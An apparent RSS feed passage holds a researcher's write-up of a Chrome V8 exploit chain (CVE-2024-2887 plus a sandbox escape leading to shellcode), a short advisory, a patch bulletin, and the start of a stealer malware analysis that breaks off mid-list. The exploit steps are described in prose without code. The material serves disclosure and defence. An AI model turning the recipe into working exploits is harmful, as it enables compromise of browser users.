<p class=""><em>In this guest blog from Master of Pwn winner Manfred Paul, he details CVE-2024-2887 – a type confusion bug that occurs in both Google Chrome and Microsoft Edge (Chromium). He used this bug as a part of his winning exploit that led to code execution in the renderer of both browsers. This bug was quickly patched by both </em><a href="https://chromereleases.googleblog.com/2024/03/stable-channel-update-for-desktop_26.html"><em>Google</em></a><em> and </em><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-2887"><em>Microsoft</em></a><em>. Manfred has graciously provided this detailed write-up of the vulnerability and how he exploited it at the contest.</em></p>





















  
  



<hr /><p>In this blog, I describe a means of exploiting the V8 JavaScript and WebAssembly engine to gain execution of arbitrary shellcode inside the renderer process. This includes a bypass of the V8 memory sandbox (<a href="https://docs.google.com/document/d/1FM4fQmIhEqPG8uGp5o9A-mnPB5BOeScZYpkHjo0KKA8/edit#heading=h.xzptrog8pyxf">Ubercage</a>), though code execution is still constrained by the process isolation-based browser sandbox. For demonstration purposes, this limitation can be removed by running the browser with the <code>--no- sandbox</code> flag. </p>
<p><b>Root Cause of the WebAssembly Universal Type Confusion</b></p>
<p>A WebAssembly module may contain a <code>type</code> section that defines a list of custom “heap types”. In the base specification, this is used only to declare function types, but with the adoption of the garbage collection (GC) <a href="https://webassembly.github.io/gc/core/_download/WebAssembly.pdf">proposal</a> [PDF], this section can additionally define struct types, allowing for the use of composite, heap-allocated types in WebAssembly. </p>
<p>Normally, a struct declared in this section may only reference structs that precede it  (structs with a lower type index). To support mutually recursive data structures, a feature called recursive type groups is available. Instead of declaring the (potentially) mutually recursive types as individual entries in the type section, a recursive group is declared as a single type section entry. Within this group, individual types are declared, which are thereby allowed to reference each other.</p>
<p>With this in mind, consider the function responsible for parsing the <code>type</code> section from the binary WebAssembly format in <code>v8/src/wasm/module-decoder-impl.h</code>: </p>

<p>At (1), the limit <code>kV8MaxWasmTypes</code> (currently equal to 1,000,000) is passed as a maximum to <code>consume_count()</code>, ensuring that at most this many entries are read from the <code>type</code> section. When recursive type groups were added, this check became insufficient. While this code will permit only <code>kV8MaxWasmTypes</code> entries of the <code>type</code> section to be read, each of those can potentially be a recursive type group containing more than one individual type definition. </p>
<p>This insufficiency was clearly noticed at the time of this change, as together with recursive type groups a second check was added at (2). Here, for each recursive type group, it is checked that the addition of the constituent types would not exceed the <code>kV8MaxWasmTypes</code> limit. </p>
<p>However, this second check is still not enough. While it protects the indices of each type allocated inside a recursive group, the presence of those groups also has implications for types declared outside this group, as each recursive group adds to the total count of declared types. </p>
<p>To make this clearer, imagine a type section consisting of two entries: one recursive group containing<code>kV8MaxWasmTypes</code> entries, and following that group, one non-recursive type. The check at (1) is passed, as the section only has two entries. While processing the recursive group, the check at (2) is also passed, as the section has exactly <code>kV8MaxWasmTypes</code> entries. For the following single type, there is no further check: at (3) the type is simply allocated at the next free index. In this case, the index will be  <code>kV8MaxWasmTypes</code>, exceeding the usual maximum of <code>kV8MaxWasmTypes-1</code>. If there were more than one non-recursive type at the end of the <code>type</code> section, they would similarly get assigned <code>kV8MaxWasmTypes+1</code>, <code>kV8MaxWasmTypes+2</code>, and so forth, as type indices. </p>
<p><b>Impact of the Root Cause</b></p>
<p>Exceeding the maximal number of declared heap types might seem like a very harmless resource exhaustion bug at first. However, due to some internal details of how V8 handles WebAssembly heap types, it directly allows constructing some very powerful exploit primitives. </p>
<p>In <code>v8/src/wasm/value-type.h</code>, the encoding of heap types is defined: </p>

<p>Here, V8 assumes that all user-defined heap types will be assigned indices smaller than <code>kV8MaxWasmTypes</code>. Larger indices are reserved for fixed, internal heap types (beginning with <code>kFunc</code>). This results in our own type declarations aliasing one of these internal types, leading to many opportunities for type confusion. </p>
<p><b>Universal WebAssembly Type Confusion</b></p>
<p>To leverage this encoding ambiguity into a full type confusion, let’s first consider the <code>struct.new</code> opcode, which produces a reference to a new struct created from fields given on the stack. The caller specifies the desired struct type by passing its type index. The relevant check on the type index can be found in <code>v8/src/wasm/function-body-decoder-impl.h</code>:</p>

<p>Following the validation logic into the <code>has_struct()</code> method from <code>v8/src/wasm/wasm-module.h</code>: </p>

<p>Since we can make <code>types.size()</code>  exceed the usual limit of <code>kV8MaxWasmTypes</code>, we can make the check pass even if when passing an index larger than this value. This allows us to create a reference of an arbitrary internal type that points to the struct we can freely define. </p>
<p>On the other hand, consider now the handling of the <code>ref.cast</code> instruction: </p>

<p>Here, a <code>type</code> check elimination is performed. If <code>TypeCheckAlwaysSucceeds</code> returns true, then no actual <code>type</code> check is emitted and the value is simply reinterpreted as the target <code>type</code>.</p>
<p>The function <code>TypeCheckAlwaysSucceeds</code> ultimately calls <code>IsHeapSubtypeOfImpl</code> defined in <code>v8/src/wasm/wasm-subtyping.cc</code>:</p>

<p>This means that if our declared type index aliases the constant <code>HeapType::kNone</code>, the type check will always be elided if we cast to any non-function, non-external reference. In combination, we can use this to turn any reference type into any other by the following steps: </p>
<ol>
<li><p>   In the type section, define a structure type with a single field of type <code>anyref</code>, and make this struct have a type index equal to <code>HeapType::kNone</code> using the bug described above. </p>
</li>
<li><p>   Place a non-null reference value of any type on the top of the stack and call <code>struct.new</code> with the type index set to <code>HeapType::kNone</code>. This will succeed, as <code>has_struct()</code> validates the index against the index established via the previous step. </p>
</li>
<li><p>   Also, declare a struct with a normal type index lower than <code>kV8MaxWasmTypes</code> with a single field of the target reference type. Call <code>ref.cast</code> with this  this struct’s type index. The engine will not perform any type check, as the input value is at this point understood to be reference type <code>HeapType::kNone</code>.</p>
</li>
<li><p>   Finally, read back the reference stored in the struct by executing <code>struct.get</code>.</p>
</li>
</ol>
<p>This arbitrary casting of reference types allows transmuting any value type into any other by referencing it, changing the reference type, and then dereferencing it – a universal type confusion. </p>
<p>In particular, this directly contains nearly all usual JavaScript engine exploitation primitives as special cases:</p>
<p>•	Transmuting <code>int</code> to <code>int*</code> and then dereferencing results in an arbitrary read.</p>
<p>•	Transmuting <code>int</code> to <code>int*</code> and then writing to that reference results in an arbitrary write.</p>
<p>•	Transmuting <code>externref</code>to <code>int</code> is the <code>addrOf()</code> primitive, obtaining the address of a JavaScript object.</p>
<p>•	Transmuting <code>int</code> to <code>externref</code> is the <code>fakeObj()</code> primitive, forcing the engine to treat an arbitrary value as a pointer to a JavaScript object. </p>
<p>While casting from <code>HeapType::kNone</code> to an <code>externref</code> is not allowed, remember that we are actually operating on one more level of indirection - transmuting to <code>externref</code> involves casting to a reference to a struct containing one <code>externref</code> member.</p>
<p>Note however that these “arbitrary” reads and writes are still contained in the V8 memory sandbox, as all involved pointers to heap-allocated structures are tagged, compressed pointers inside the heap cage, not full 64-bit raw pointers. </p>
<p><b>Integer Underflow Leading to V8 Sandbox Escape</b> </p>
<p>The primitives described above allow for freely manipulating and faking most JavaScript objects. However, all of this happens inside the limited memory space of the V8 sandbox. “Trusted” objects such as WebAssembly instance data cannot yet be manipulated. We will now turn our attention to a bug that can be used to escape the memory sandbox.</p>
<p>An often-used object for JavaScript engine exploits is <code>ArrayBuffer</code> and its corresponding views, (i.e. typed arrays), as it allows for direct, untagged access to some region of memory. </p>
<p>To prevent access to pointers outside the V8 sandbox, sandboxed pointers are used to designate a typed array’s corresponding backing store. Similarly, an ArrayBuffer’s length field is always loaded as a “bounded size access”, inherently limiting its value to a maximum of 235 − 1. </p>
<p>However, in modern JavaScript, the handling of typed arrays has become quite complex due to the introduction of resizable ArrayBuffers (RABs) and their sharable variant, growable SharedArrayBuffers (GSABs). Both variants feature the ability to change their length after the object has been created with the shared variant being restricted to never shrink. In particular, for typed arrays with these kinds of buffers, the array length can never be cached and must be recomputed on each access.</p>
<p>Additionally, ArrayBuffers also feature an offset field, describing the start of the data in the 
actual underlying backing store. This offset must be taken into account when computing the length. </p>
<p>Let’s now look at the code responsible for building a TypedArray’s length access in the optimizing Turbofan compiler. It can be found in <code>v8/src/compiler/graph-assembler.cc</code>. Note that most non-RAB/GSAB cases and the code responsible for dispatching are omitted for simplicity: </p>

<p>For arrays backed by a resizable ArrayBuffer, we can see at (1) that the length is computed as <code>floor((byte_length - byte_offset) / element_size)</code>. Crucially, there is an underflow check. If <code>byte_offset</code> exceeds <code>byte_length</code>, then 0 is returned instead. </p>
<p>Curiously though, in the case of a GSAB-backed array, the corresponding underflow check is missing. Thus, if <code>byte_offset</code> is larger than <code>byte_length</code>, an underflow occurs and the subtraction wraps around to something close to the maximum unsigned 64-bit integer 264. As both of these fields are found in the (by now) attacker-controlled array object, we can easily trigger this using the sandboxed arbitrary read/write primitives discussed previously. This results in access to the whole 64-bit address space, as the length computed by this function is used to bound any typed array accesses (in JIT-compiled code). </p>
<p><b>Exploitation for Arbitrary Shellcode Execution</b></p>
<p>Using the two bugs described above, exploitation becomes fairly straightforward. The primitives described in the Universal WebAssembly Type Confusion section directly give arbitrary reads and writes within the V8 memory sandbox. This can then be used to manipulate a growable <code>SharedArrayBuffer</code> to have an offset greater than its length. A previously JIT-compiled read/write function can then be used to access and overwrite data anywhere in the process’s address space. An appropriate target for overwrite is the compiled code of a <code>WebAssembly</code> module, since that resides in an RWX (read-write-execute) page and can be overwritten with shellcode.</p>

<hr />


  <p class=""><em>Thanks again to Manfred for providing this thorough write-up. He has contributed multiple bugs to the ZDI program over the last few years, and we certainly hope to see more submissions from him in the future. Until then, follow the team on </em><a href="https://www.twitter.com/thezdi"><em>Twitter</em></a><em>, </em><a href="https://infosec.exchange/@thezdi"><em>Mastodon</em></a><em>, </em><a href="https://www.linkedin.com/company/zerodayinitiative"><em>LinkedIn</em></a><em>, or </em><a href="https://www.instagram.com/thezdi"><em>Instagram</em></a><em> for the latest in exploit techniques and security patches.</em></p>
]]></content:encoded>
<pubDate>Thu, 02 May 2024 16:14:11 +0000</pubDate>
</item>
<item>
<title>ZDI-24-1041: Google Chrome Updater DosDevices Local Privilege Escalation Vulnerability</title>
<link>http://www.zerodayinitiative.com/advisories/ZDI-24-1041/</link>
<guid>http://www.zerodayinitiative.com/advisories/ZDI-24-1041/</guid>
<content:encoded><![CDATA[
This vulnerability allows local attackers to escalate privileges on affected installations of Google Chrome. An attacker must first obtain the ability to execute low-privileged code on the target system in order to exploit this vulnerability. The ZDI has assigned a CVSS rating of 7.8. The following CVEs are assigned: CVE-2023-7261.
]]></content:encoded>
<pubDate>Thu, 01 Aug 2024 00:00:00 -0500</pubDate>
</item>
<item>
<title>High-Risk CVE-2024-7965 Vulnerability in Chrome’s V8 Engine Requires Quick Fix</title>
<link>https://cyble.com/blog/high-risk-cve-2024-7965-vulnerability-in-chromes-v8-engine-requires-quick-fix/</link>
<guid>https://cyble.com/blog/high-risk-cve-2024-7965-vulnerability-in-chromes-v8-engine-requires-quick-fix/</guid>
<content:encoded><![CDATA[
<p><img alt="Cyble-blogs-CVE-2024-7965-Vulnerability" class="attachment-post-thumbnail size-post-thumbnail wp-post-image" height="600" src="https://cyble.com/wp-content/uploads/2024/08/Cyble-blogs-CVE-2024-7965-Vulnerability.jpg" tabindex="0" width="1200" /></p>
<p><!-- wp:paragraph --></p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:heading --></p>
<h2 class="wp-block-heading"><a></a>Key Takeaways</h2>
<p><!-- /wp:heading --></p>
<p><!-- wp:paragraph --></p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:list --></p>
<ul class="wp-block-list"><!-- wp:list-item --></p>
<li>CISA has included a type of confusion vulnerability affecting Google Chrome and potentially other Chromium-based browsers in its Known Exploited Vulnerabilities (KEV) catalog, highlighting its seriousness and potential for exploitation.</li>
<p><!-- /wp:list-item --></p>
<p><!-- wp:list-item --></p>
<li>CVE-2024-7965 affects Chrome's V8 JavaScript engine, allowing attackers to exploit heap corruption through specially crafted HTML pages. Its high CVSS score of 8.8 indicates a severe threat to system confidentiality and integrity.</li>
<p><!-- /wp:list-item --></p>
<p><!-- wp:list-item --></p>
<li>Google has acknowledged that CVE-2024-7965 is actively being exploited. A critical patch has been released in Chrome versions 128.0.6613.84 for Linux and 128.0.6613.84/.85 for Windows and Mac.</li>
<p><!-- /wp:list-item --></p>
<p><!-- wp:list-item --></p>
<li>Due to the active exploitation of this vulnerability, it is crucial for all users to update their browsers immediately to the latest version to protect against potential data breaches and security risks.</li>
<p><!-- /wp:list-item --></p>
<p><!-- wp:list-item --></p>
<li>The latest <a href="https://cyble.com/blog/tag/google-chrome/">Chrome update</a> not only addresses xf but also includes 38 security fixes for other issues, several of which were identified by external researchers.</li>
<p><!-- /wp:list-item --></ul>
<p><!-- /wp:list --></p>
<p><!-- wp:heading --></p>
<h2 class="wp-block-heading"><a></a>Overview</h2>
<p><!-- /wp:heading --></p>
<p><!-- wp:paragraph --></p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p>CISA has recently added a type of confusion vulnerability to its Known Exploited Vulnerabilities (KEV) catalog. This flaw affects the popular Google Chrome browser and potentially other Chromium-based browsers. It poses a serious risk and has been rated as high due to its potential for exploitation.</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p>Type confusion vulnerabilities, like the one found in Google Chrome's V8 engine, can allow remote attackers to cause heap corruption through specially crafted HTML pages. This issue isn't limited to Google Chrome; it could also impact other Chromium-based browsers, such as Microsoft Edge, Opera, and more.</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p>Google is aware that this <a href="https://cyble.com/solutions/vulnerability-management/">vulnerability</a> is being actively exploited in the wild. In response, they have recently addressed a critical zero-day vulnerability, CVE-2024-7965, which affects versions of Chrome earlier than 128.0.6613.84.</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:heading --></p>
<h2 class="wp-block-heading"><a></a>Technical Details of CVE-2024-7965</h2>
<p><!-- /wp:heading --></p>
<p><!-- wp:paragraph --></p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p>CVE-2024-7965 affects the V8 JavaScript engine used in Google Chrome. This <a href="https://cyble.com/knowledge-hub/zero-day-exploit/">zero-day vulnerability</a> stems from a flawed implementation that allows attackers to exploit heap corruption through specially crafted HTML pages. With a CVSS score of 8.8, it poses a serious threat to the confidentiality and integrity of affected systems.</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p>First discovered by the security researcher known as “TheDog” on July 30, 2024, this flaw has prompted Google to issue a critical update. The patch is available in Chrome version 128.0.6613.84 for Linux and 128.0.6613.84/.85 for Windows and Mac.</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p>Given that CVE-2024-7965 is actively being exploited, users must apply this update immediately. Google has been proactive in addressing such threats, as demonstrated by their previous work on CVE-2024-7971, another critical flaw in the V8 engine.</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p>Exploitation of CVE-2024-7965 requires user interaction, such as visiting a compromised webpage, which could lead to unauthorized access or execution of malicious code. Therefore, both organizations and individual users are strongly urged to update their browsers to safeguard against potential data breaches and other <a href="https://cyble.com/knowledge-hub/cybersecurity/">cybersecurity</a> risks.</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p>This vulnerability is part of a larger set of security issues addressed in the latest Chrome update, which includes 38 security fixes, several of which were reported by external researchers.</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:heading --></p>
<h2 class="wp-block-heading"><a></a>Conclusion</h2>
<p><!-- /wp:heading --></p>
<p><!-- wp:paragraph --></p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p>The CVE-2024-7965 vulnerability represents a significant security risk for Google Chrome and other Chromium-based browsers. With a high CVSS score of 8.8, this type of confusion flaw in the V8 JavaScript engine can lead to severe consequences if exploited. Given that this vulnerability is actively being targeted, users must promptly update their browsers to the latest version. Google’s recent update addresses this critical issue along with 37 other security fixes, highlighting the importance of staying current with software updates to protect against potential threats.</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:heading --></p>
<h2 class="wp-block-heading"><a></a>Our Recommendations</h2>
<p><!-- /wp:heading --></p>
<p><!-- wp:paragraph --></p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:list --></p>
<ul class="wp-block-list"><!-- wp:list-item --></p>
<li>Please ensure that all instances of Google Chrome are promptly updated to the most recent version available. The latest updates include crucial security fixes intended to address this vulnerability.</li>
<p><!-- /wp:list-item --></p>
<p><!-- wp:list-item --></p>
<li>Activate automatic updates in Chrome to receive timely patches and security updates without manual intervention.</li>
<p><!-- /wp:list-item --></p>
<p><!-- wp:list-item --></p>
<li>Set up comprehensive monitoring and logging solutions to identify and examine suspicious activities.</li>
<p><!-- /wp:list-item --></p>
<p><!-- wp:list-item --></p>
<li>Develop a thorough patch management strategy that encompasses inventory management, patch assessment, testing, deployment, and verification.</li>
<p><!-- /wp:list-item --></p>
<p><!-- wp:list-item --></p>
<li>Enforce proper network segmentation to prevent exposure of critical assets over the internet.</li>
<p><!-- /wp:list-item --></p>
<p><!-- wp:list-item --></p>
<li>Keep an updated inventory of all internal and external assets, comprising hardware, software, and network components.</li>
<p><!-- /wp:list-item --></ul>
<p><!-- /wp:list --></p>
<p>The post <a href="https://cyble.com/blog/high-risk-cve-2024-7965-vulnerability-in-chromes-v8-engine-requires-quick-fix/" rel="nofollow">High-Risk CVE-2024-7965 Vulnerability in Chrome’s V8 Engine Requires Quick Fix</a> appeared first on <a href="https://cyble.com" rel="nofollow">Cyble</a>.</p>
]]></content:encoded>
<pubDate>Tue, 27 Aug 2024 14:28:01 +0000</pubDate>
</item>
<item>
<title>New Cheana Stealer Targets VPN Users Across Multiple Operating Systems</title>
<link>https://cyble.com/blog/new-cheana-stealer-targets-vpn-user/</link>
<guid>https://cyble.com/blog/new-cheana-stealer-targets-vpn-user/</guid>
<content:encoded><![CDATA[
<p><img alt="2" class="attachment-post-thumbnail size-post-thumbnail wp-post-image" height="600" src="https://cyble.com/wp-content/uploads/2024/08/2.webp" tabindex="0" width="1200" /></p>
<p><!-- wp:heading --></p>
<h2 class="wp-block-heading">Key takeaways&nbsp;</h2>
<p><!-- /wp:heading --></p>
<p><!-- wp:list --></p>
<ul class="wp-block-list"><!-- wp:list-item --></p>
<li>Cyble Research and Intelligence Lab (CRIL) has identified a <a href="https://cyble.com/knowledge-hub/what-is-phishing/">phishing</a> site impersonating a VPN provider. The site specifically targets individuals downloading Virtual Private Network (VPN) applications for Windows, Linux, and macOS. </li>
<p><!-- /wp:list-item --></ul>
<p><!-- /wp:list --></p>
<p><!-- wp:list --></p>
<ul class="wp-block-list"><!-- wp:list-item --></p>
<li>The Threat Actor (TA) has created distinct binaries for each platform—Windows, Linux, and macOS—targeting users across these systems.&nbsp;</li>
<p><!-- /wp:list-item --></ul>
<p><!-- /wp:list --></p>
<p><!-- wp:list --></p>
<ul class="wp-block-list"><!-- wp:list-item --></p>
<li>The Windows version of the stealer targets cryptocurrency-related browser extensions, standalone crypto wallets, and stored browser passwords.&nbsp;</li>
<p><!-- /wp:list-item --></ul>
<p><!-- /wp:list --></p>
<p><!-- wp:list --></p>
<ul class="wp-block-list"><!-- wp:list-item --></p>
<li>The Linux Version of the stealer Focuses on cryptocurrency browser extensions, standalone crypto wallets, browser login data, cookies, and SSH keys.&nbsp;</li>
<p><!-- /wp:list-item --></ul>
<p><!-- /wp:list --></p>
<p><!-- wp:list --></p>
<ul class="wp-block-list"><!-- wp:list-item --></p>
<li>In addition to cryptocurrency browser extensions and crypto wallets, MacOS version steals browser login data, cookies, SSH keys, MacOS passwords, and Keychain.&nbsp;&nbsp;</li>
<p><!-- /wp:list-item --></ul>
<p><!-- /wp:list --></p>
<p><!-- wp:list --></p>
<ul class="wp-block-list"><!-- wp:list-item --></p>
<li>The campaign is linked to a Telegram channel with over 54,000 subscribers, active since 2018, and believed to have undergone a change in operators in 2021.&nbsp;</li>
<p><!-- /wp:list-item --></ul>
<p><!-- /wp:list --></p>
<p><!-- wp:list --></p>
<ul class="wp-block-list"><!-- wp:list-item --></p>
<li>The phishing site has undergone multiple registrar changes, with the most recent switch occurring on August 21, 2024.&nbsp;</li>
<p><!-- /wp:list-item --></ul>
<p><!-- /wp:list --></p>
<p><!-- wp:list --></p>
<ul class="wp-block-list"><!-- wp:list-item --></p>
<li>Initially, the <a href="https://cyble.com/knowledge-hub/cyber-threat-actor-and-types/">Threat Actors</a> (TAs) appeared to provide legitimate VPN services, gradually gaining user trust. They later shifted to distributing stealer, exploiting the trust they had built. </li>
<p><!-- /wp:list-item --></ul>
<p><!-- /wp:list --></p>
<p><!-- wp:heading --></p>
<h2 class="wp-block-heading">Overview&nbsp;</h2>
<p><!-- /wp:heading --></p>
<p><!-- wp:paragraph --></p>
<p>Threat actors (TAs) predominantly rely on phishing websites as a method to distribute malware. A key tactic involves impersonating well-known brands, especially those associated with essential or security-related applications, to enhance the credibility of their campaigns. They create a false sense of legitimacy by showcasing compatibility with various platforms and mimicking trusted applications. This deceptive approach exploits users' trust in familiar brands, making it easier for TAs to trick unsuspecting individuals into downloading malicious software. The sophisticated blend of brand impersonation and the appearance of security further reinforces the illusion of authenticity, increasing the chances of successful infiltration.&nbsp;</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p>Recently, CRIL has identified a phishing website aimed at individuals downloading VPN applications for Windows, Linux, and macOS. The TA has created separate stealer binaries for each operating system, using a deceptive site that mimics the legitimate "WarpVPN" service. This phishing site offers detailed installation instructions specific to each platform. Once installed, the stealer extracts various sensitive data from the victim’s machine. It targets cryptocurrency-related browser extensions, standalone crypto wallets, stored browser passwords, browser login data, cookies, SSH keys, macOS passwords, and Keychain. The below image shows the phishing website.&nbsp;</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:image {"id":56932,"sizeSlug":"full","linkDestination":"none","align":"center"} --></p>
<figure class="wp-block-image aligncenter size-full"><img alt="Phishing site " class="wp-image-56932" src="https://cyble.com/wp-content/uploads/2024/08/Figure-1-Phishing-site.png" /></figure>
<p><!-- /wp:image --></p>
<p><!-- wp:paragraph {"align":"center"} --></p>
<p class="has-text-align-center"><em>Figure </em><em>1</em><em> - Phishing site</em>&nbsp;</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p>We have named this stealer "Cheana Stealer," based on the C&amp;C server name "ganache.live" and TA's frequent use of the string "ganache" in the stealer’s code.&nbsp;</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:heading --></p>
<h2 class="wp-block-heading">Spreading Mechanism&nbsp;</h2>
<p><!-- /wp:heading --></p>
<p><!-- wp:paragraph --></p>
<p>During our investigation, we discovered a Telegram channel linked to this campaign. The phishing website associated with the campaign is referenced in the channel's bio. This channel has over 54,000 subscribers and plays a crucial role in the distribution of malicious content. The figure below displays the Telegram channel.&nbsp;&nbsp;</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:image {"id":56933,"sizeSlug":"full","linkDestination":"none","align":"center"} --></p>
<figure class="wp-block-image aligncenter size-full"><img alt="Telegram Channel " class="wp-image-56933" src="https://cyble.com/wp-content/uploads/2024/08/Figure-2-Telegram-Channel.png" /></figure>
<p><!-- /wp:image --></p>
<p><!-- wp:paragraph {"align":"center"} --></p>
<p class="has-text-align-center"><em>Figure </em><em>2</em><em> - Telegram Channel</em>&nbsp;</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p>Upon further investigation, we found that this channel has been active since at least 2018, with several profile changes over time, as shown in the figure below. Notably, the phishing site was added to its bio in 2021.&nbsp;&nbsp;</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:image {"id":56934,"sizeSlug":"full","linkDestination":"none","align":"center"} --></p>
<figure class="wp-block-image aligncenter size-full"><img alt="Telegram Profile Changes " class="wp-image-56934" src="https://cyble.com/wp-content/uploads/2024/08/Figure-3-Telegram-Profile-Changes.png" /></figure>
<p><!-- /wp:image --></p>
<p><!-- wp:paragraph {"align":"center"} --></p>
<p class="has-text-align-center"><em>Figure </em><em>3</em><em> - Telegram Profile Changes</em>&nbsp;</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p>The phishing site has switched registrars’ multiple times, with the most recent change occurring on August 21, 2024. We suspect that the TAs initially provided legitimate services and are now taking advantage of the trust they've built to distribute stealer <a href="https://cyble.com/knowledge-hub/what-is-malware/">malware</a>. Posts from 2021 indicate that the TAs offered free VPN services individually, as illustrated in the figure below, further supporting this claim. </p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:image {"id":56936,"sizeSlug":"full","linkDestination":"none","align":"center"} --></p>
<figure class="wp-block-image aligncenter size-full"><img alt="Warpvpn Site in 2021 " class="wp-image-56936" src="https://cyble.com/wp-content/uploads/2024/08/Figure-4-Warpvpn-Site-in-2021.png" /></figure>
<p><!-- /wp:image --></p>
<p><!-- wp:paragraph {"align":"center"} --></p>
<p class="has-text-align-center"><em>Figure </em><em>4</em><em> - Warpvpn Site in 2021</em>&nbsp;</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p>The figure below shows the post made in 2021.&nbsp;&nbsp;</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:image {"id":56937,"sizeSlug":"full","linkDestination":"none","align":"center"} --></p>
<figure class="wp-block-image aligncenter size-full"><img alt="Telegram post made in 2021 " class="wp-image-56937" src="https://cyble.com/wp-content/uploads/2024/08/Figure-5-Telegram-post-made-in-2021.png" /></figure>
<p><!-- /wp:image --></p>
<p><!-- wp:paragraph {"align":"center"} --></p>
<p class="has-text-align-center"><em>Figure </em><em>5</em><em> - Telegram post made in 2021</em>&nbsp;</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p>We also observed that a Russian native speaker likely wrote posts made before 2021, while posts from 2021 appear to be auto-translated versions, as shown in the figure below. Interestingly, the phishing domain was also added to the channel's bio in 2021, suggesting that the operator of the Telegram channel may have changed during that time.&nbsp;&nbsp;</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:image {"id":56938,"sizeSlug":"full","linkDestination":"none","align":"center"} --></p>
<figure class="wp-block-image aligncenter size-full"><img alt="Comparison between 2019 &amp; 2021 posts " class="wp-image-56938" src="https://cyble.com/wp-content/uploads/2024/08/Figure-6-Comparison-between-2019-2021-posts.png" /></figure>
<p><!-- /wp:image --></p>
<p><!-- wp:paragraph {"align":"center"} --></p>
<p class="has-text-align-center"><em>Figure </em><em>6</em><em> - Comparison between 2019 &amp; 2021 posts</em>&nbsp;</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p>Additionally, in 2021, the channel's profile photo was updated to an image taken by a Russian YouTuber, as shown in the figure below. Moreover, upon investigating the contact person mentioned in the channel, we discovered that they have a history of frequent interactions with Arabic speakers. This further suggests that the channel's operator might be from a different origin, attempting to pose as a Russian individual.&nbsp;&nbsp;</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:image {"id":56939,"sizeSlug":"full","linkDestination":"none","align":"center"} --></p>
<figure class="wp-block-image aligncenter size-full"><img alt="Telegram Channel Icon " class="wp-image-56939" src="https://cyble.com/wp-content/uploads/2024/08/Figure-7-Telegram-Channel-Icon.png" /></figure>
<p><!-- /wp:image --></p>
<p><!-- wp:paragraph {"align":"center"} --></p>
<p class="has-text-align-center"><em>Figure </em><em>7</em><em> - Telegram Channel Icon</em>&nbsp;</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:heading --></p>
<h2 class="wp-block-heading">Technical Analysis&nbsp;</h2>
<p><!-- /wp:heading --></p>
<p><!-- wp:paragraph --></p>
<p>In this campaign, the TAs set up a phishing site that impersonates a legitimate VPN service, offering detailed installation instructions for Windows, Linux, and macOS.&nbsp; The initial infection occurs when users follow the phishing site’s instructions, which involve copying and pasting platform-specific commands into their systems. Each set of commands—tailored for Windows, macOS, and Linux—ensures the malicious code is executed correctly on the respective operating system.&nbsp;</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p>In this section, we will examine how TA steals sensitive information across different platforms, focusing on both common techniques and platform-specific approaches.&nbsp;</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:heading {"level":3} --></p>
<h3 class="wp-block-heading">Windows&nbsp;</h3>
<p><!-- /wp:heading --></p>
<p><!-- wp:paragraph --></p>
<p>For Windows, the TA utilizes PowerShell commands to carry out the attack. They use ‘<em>Invoke-WebRequest</em>’ to download the “<em>install.bat</em>” file from "hxxps://warpvpn[.]net". Following the download, ‘<em>Start-Process</em>’ command is used to launch a new instance of ‘<em>cmd.exe’</em>, passing ‘<em>install.bat</em>’ as an argument to execute the batch file. This method ensures the ‘install.bat’ script is run seamlessly as part of the attack. As shown in the image below, the TA instructs users to copy and paste commands intended for PowerShell into the Command Prompt. These commands will not work properly in the Command Prompt and will only execute correctly within a PowerShell environment.&nbsp;&nbsp;</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:image {"id":56940,"sizeSlug":"full","linkDestination":"none","align":"center"} --></p>
<figure class="wp-block-image aligncenter size-full"><img alt="installation instructions for windows " class="wp-image-56940" src="https://cyble.com/wp-content/uploads/2024/08/Figure-8-–-installation-instruction-for-windows.png" /></figure>
<p><!-- /wp:image --></p>
<p><!-- wp:paragraph {"align":"center"} --></p>
<p class="has-text-align-center"><em>Figure </em><em>8</em><em> – installation instructions for windows</em>&nbsp;</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p>The <em>“install.bat”</em> script performs the following things:&nbsp;</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:list --></p>
<ul class="wp-block-list"><!-- wp:list-item --></p>
